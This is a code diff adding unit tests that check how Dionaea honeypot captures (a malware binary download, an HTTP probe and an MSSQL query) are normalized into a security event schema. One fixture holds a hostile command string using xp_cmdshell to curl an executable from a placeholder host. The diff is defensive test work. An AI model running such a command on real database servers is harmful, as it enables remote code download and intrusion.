@@ -892,6 +892,93 @@ class TestNormalizeDionaeaBinaryCapture:
         if "file_hash_sha256" in result.columns:
             assert result.get_column("file_hash_sha256").null_count() == result.height
 
+    def test_attributed_binary_capture_carries_src_ip_and_download_url(self) -> None:
+        """lantana_json attributed binary captures preserve src_endpoint_ip & file_url."""
+        df = pl.DataFrame(
+            [
+                {
+                    "timestamp": "2026-11-21T14:00:00Z",
+                    "eventid": "dionaea.binary.captured",
+                    "src_ip": "198.51.100.44",
+                    "dst_ip": "10.50.99.100",
+                    "src_port": 49152,
+                    "dst_port": 445,
+                    "connection_protocol": "smbd",
+                    "connection_transport": "tcp",
+                    "connection_type": "accept",
+                    "shasum": "b" * 64,
+                    "binary_file_name": "deadbeef",
+                    "download_url": "http://stager.example.org/payload.exe",
+                    "dataset": "dionaea",
+                }
+            ]
+        )
+        result = normalize_dionaea(df)
+        row = result.row(0, named=True)
+        assert row["class_uid"] == CLASS_FILE_ACTIVITY
+        assert row["src_endpoint_ip"] == "198.51.100.44"
+        assert row["file_hash_sha256"] == "b" * 64
+        assert row["file_url"] == "http://stager.example.org/payload.exe"
+        assert row["file_name"] == "deadbeef"
+        assert row["file_intent"] == "malware"
+        assert "download_url" not in result.columns
+        assert "shasum" not in result.columns
+
+    def test_dionaea_http_and_sql_commands_normalize_cleanly(self) -> None:
+        """HTTP requests preserve payload metadata; SQL queries map to process activity."""
+        df = pl.DataFrame(
+            [
+                {
+                    "timestamp": "2026-11-21T14:01:00Z",
+                    "src_ip": "198.51.100.55",
+                    "dst_ip": "10.50.99.100",
+                    "src_port": 50001,
+                    "dst_port": 80,
+                    "connection_protocol": "httpd",
+                    "connection_transport": "tcp",
+                    "connection_type": "accept",
+                    "http_method": "POST",
+                    "http_uri": "/v1/chat/completions",
+                    "http_user_agent": "SyntheticProbe/1.0",
+                    "http_host": "example.com",
+                    "http_content_type": "application/json",
+                    "http_body_preview": '{"model":"gpt-4","messages":[]}',
+                    "sql_command": None,
+                    "dataset": "dionaea",
+                },
+                {
+                    "timestamp": "2026-11-21T14:02:00Z",
+                    "src_ip": "198.51.100.56",
+                    "dst_ip": "10.50.99.100",
+                    "src_port": 50002,
+                    "dst_port": 1433,
+                    "connection_protocol": "mssqld",
+                    "connection_transport": "tcp",
+                    "connection_type": "accept",
+                    "http_method": None,
+                    "http_uri": None,
+                    "http_user_agent": None,
+                    "http_host": None,
+                    "http_content_type": None,
+                    "http_body_preview": None,
+                    "sql_command": "EXEC xp_cmdshell 'curl http://drop.example.org/x.exe'",
+                    "dataset": "dionaea",
+                },
+            ]
+        )
+        result = normalize_dionaea(df)
+        http_row = result.filter(pl.col("src_endpoint_ip") == "198.51.100.55").row(0, named=True)
+        assert http_row["class_uid"] == CLASS_NETWORK_ACTIVITY
+        assert http_row["message"] == "HTTP POST /v1/chat/completions"
+        assert http_row["http_method"] == "POST"
+        assert http_row["http_body_preview"] == '{"model":"gpt-4","messages":[]}'
+
+        sql_row = result.filter(pl.col("src_endpoint_ip") == "198.51.100.56").row(0, named=True)
+        assert sql_row["class_uid"] == CLASS_PROCESS_ACTIVITY
+        assert sql_row["severity_id"] == 3  # MEDIUM
+        assert "xp_cmdshell" in sql_row["actor_process_cmd_line"]
+        assert "sql_command" not in result.columns
+
 
 # ---------------------------------------------------------------------------
 # Dataset dispatcher
